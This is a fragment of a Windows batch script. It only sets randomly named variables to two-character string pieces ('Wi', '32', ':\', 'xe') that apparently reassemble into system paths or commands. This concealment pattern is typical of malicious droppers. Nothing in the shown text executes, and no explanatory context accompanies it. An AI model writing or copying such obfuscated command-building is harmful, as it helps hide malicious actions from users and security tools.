@echo off
set "BlETxFaVXv=:\"
set "ajaUjqQGyX=xe"
set "lBnRwHzaIg=.e"
set "YllYQJMCbh= C"
set "RCqWRwUfMu=ll"
set "qgWvZYcTmO=32"
set "xqMChERbsO= /"
set "FGhAIgTKUV=s\"
set "XlnEpbNjPU=\v"
set "wSsAeVFAyA=Wi"
